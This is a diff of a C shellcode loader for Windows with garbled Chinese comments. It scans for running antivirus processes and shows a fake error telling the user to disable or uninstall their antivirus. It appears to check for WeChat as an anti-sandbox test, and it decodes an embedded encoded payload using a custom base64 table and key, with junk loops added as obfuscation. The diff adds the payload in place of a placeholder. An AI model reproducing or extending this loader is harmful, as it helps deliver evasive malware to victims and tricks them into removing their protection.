@@ -4,12 +4,12 @@
 #include <string.h>
 #include <tlhelp32.h>
 
-// å¸¸ç”¨æ€æ¯’è½¯ä»¶çš„è¿›ç¨‹å
+// ³£ÓÃÉ±¶¾Èí¼şµÄ½ø³ÌÃû
 const char* antivirus_processes[] = {
     "avp.exe", "avg.exe", "mcshield.exe", "msmpeng.exe", "kav.exe", "kaspersky.exe", "nod32.exe", "norton.exe", "symantec.exe", "eset.exe", "avast.exe", "malwarebytes.exe", "comodo.exe", "f-secure.exe", "trendmicro.exe", "avira.exe", "bitdefender.exe", "sophos.exe", "drweb.exe", "antivirus.exe"
 };
 
-// æ£€æŸ¥æ˜¯å¦å®‰è£…äº†å¸¸ç”¨æ€æ¯’è½¯ä»¶
+// ¼ì²éÊÇ·ñ°²×°ÁË³£ÓÃÉ±¶¾Èí¼ş
 int is_antivirus_installed() {
     HANDLE hProcessSnap;
     PROCESSENTRY32 pe32;
@@ -39,16 +39,16 @@ int is_antivirus_installed() {
     return 0;
 }
 
-// å¼¹å‡ºä¸å…¼å®¹æ–‡æœ¬é”™è¯¯èœå•
+// µ¯³ö²»¼æÈİÎÄ±¾´íÎó²Ëµ¥
 void show_incompatible_message() {
-    MessageBox(NULL, "æ­¤ç¨‹åºä¸æ‚¨çš„æ€æ¯’è½¯ä»¶ä¸å…¼å®¹ï¼Œè¯·å¸è½½æˆ–ç¦ç”¨æ€æ¯’è½¯ä»¶åé‡è¯•ã€‚", "ä¸å…¼å®¹é”™è¯¯", MB_OK | MB_ICONERROR);
+    MessageBox(NULL, "´Ë³ÌĞòÓëÄúµÄÉ±¶¾Èí¼ş²»¼æÈİ£¬ÇëĞ¶ÔØ»ò½ûÓÃÉ±¶¾Èí¼şºóÖØÊÔ¡£", "²»¼æÈİ´íÎó", MB_OK | MB_ICONERROR);
 }
 
 static char base64_table[] = "Ag9jCXabcJKLV2345WmnopuvwxYZklMhi78NOPrstTUByz0defDEFGHI16+/QRSq";
-static unsigned char shellcode[] = "your shellcode";
+static unsigned char shellcode[] = "dmIgeyhW/vJ7VaP8YIOnLv4FxrRC30T8mb07MGOzDv5vlg9/KnShMug7D7kmZiZ6No1An9th9r8ABCRs2dNjsE21tHCKti2xAIlq34Co1Cie39irfgl9JNMDthT7V97/BSOGAits6IHUVOa/w9z+wC9Gtvgqf0iE+imiMDdqjXmLZiZ6Nn3iSmpDKS767nhvMETzprPGCMJhQWO7Duwnk998gIaN4HJzD8pMZEZTw4PP0aPBYIChLo4HZr2iK8gTYuP8UUGXAIncHvOE3aTi0jNA9TURHuTeseomAskAa9PgJgWddzRTQ1H5KnVUwV8A96tG3mjJtxiTurzR93DrYB/cwVizWe1FGhe2/K732Ni7kN7fO7UU5OaYPFeRMbQ8VvFxSrkwimHR6sSe1EUMQa9++HN/NFI6GQZF30NI582Bk5Iyta+SeajcSJpkozvQfKoHLb/a/eMCHLyEK8OJ6U1Hh/jj4Gj65NlBk5sy0HM23q8+4yqRy2cT4EAKThVxhq0vur7DkFXglocrlrXTS621ahTBOfsgCk4c/as/tsr7Rakw89ELGsSeSEBtDurJK49J3BIEzVC7jFPtYuWE5oCP58xHwozD3Iam3AorkxUvku61rek4hosVqH9SU+yYDVZM3rjEwgBywkmn26JHfywU9EgfM0IByljikVNyAAAA";
 static char key[] = "AeB&79!ra0(3*)";
 
-// æ··æ·†åçš„è§£ç å‡½æ•°
+// »ìÏıºóµÄ½âÂëº¯Êı
 void obfuscated_base64_decode(unsigned char *input, unsigned char **output, int len) {
     if (len % 4 != 0) return;
 
@@ -73,7 +73,7 @@ void obfuscated_base64_decode(unsigned char *input, unsigned char **output, int 
     }
 }
 
-// è¿™ä¸ªå‡½æ•°æ˜¯ç”¨æ¥ç”Ÿæˆéšæœºæ•°çš„ï¼Œç”¨äºåŠ¨æ€æ··æ·†
+// Õâ¸öº¯ÊıÊÇÓÃÀ´Éú³ÉËæ»úÊıµÄ£¬ÓÃÓÚ¶¯Ì¬»ìÏı
 int generate_random_number() {
     return rand() % 100;
 }
@@ -94,7 +94,7 @@ int is_wechat_installed() {
     return 0;
 }
 
-// å†—ä½™å‡½æ•°ï¼Œå¢åŠ å¤æ‚æ€§
+// ÈßÓàº¯Êı£¬Ôö¼Ó¸´ÔÓĞÔ
 void redundant_function() {
     for (int i = 0; i < 10; i++) {
         generate_random_number();
@@ -103,7 +103,7 @@ void redundant_function() {
 
 void excess_code() {
     if (is_wechat_installed() == 0) {
-        printf("æœªé€šè¿‡å¾®ä¿¡æ£€æµ‹");
+        printf("Î´Í¨¹ıÎ¢ĞÅ¼ì²â");
     }
 }
 
@@ -122,12 +122,12 @@ int main() {
     long long b  = 1;
     long long c = 0;
 
-    // æ··æ·†ä»£ç æ®µ
-    redundant_function();  // å¢åŠ å†—ä½™ä»£ç 
+    // »ìÏı´úÂë¶Î
+    redundant_function();  // Ôö¼ÓÈßÓà´úÂë
 
     obfuscated_base64_decode(shellcode, &decoded, shellcode_len);
     for(int i = shellcode_len/4*3-1; i >= 0; i--){
-        for(int j = 0; j <= generate_random_number(); j++){ // åŠ¨æ€æ··æ·†
+        for(int j = 0; j <= generate_random_number(); j++){ // ¶¯Ì¬»ìÏı
             for(int k = 0; k <= generate_random_number(); k++){
                 c = a + b;
                 a = b;
